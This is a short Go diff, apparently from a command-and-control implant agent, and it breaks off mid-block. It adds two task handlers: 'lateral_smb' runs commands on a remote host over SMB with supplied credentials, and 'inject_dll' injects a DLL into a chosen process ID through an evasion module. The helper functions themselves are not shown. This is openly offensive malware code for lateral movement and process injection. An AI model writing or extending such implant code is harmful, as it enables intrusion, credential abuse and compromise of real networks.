@@ -298,3 +298,23 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 		parts := strings.Split(args, "|")
 		if len(parts) >= 4 {
 			lm := postexploit.NewLateralMovement()
+			err := lm.SMBExec(parts[0], parts[1], parts[2], parts[3])
+			if err != nil {
+				result = "SMB exec failed: " + err.Error()
+			} else {
+				result = "SMB executed on " + parts[0]
+			}
+		} else {
+			result = "usage: lateral_smb target|username|password|command"
+		}
+
+	case "inject_dll":
+		parts := strings.Split(args, ":")
+		if len(parts) == 2 {
+			var pid int
+			fmt.Sscanf(parts[0], "%d", &pid)
+			err := a.evasion.InjectDLL(pid, parts[1])
+			if err != nil {
+				result = fmt.Sprintf("DLL injection failed: %v", err)
+			} else {
+				result = fmt.Sprintf("DLL injected into PID %d", pid)
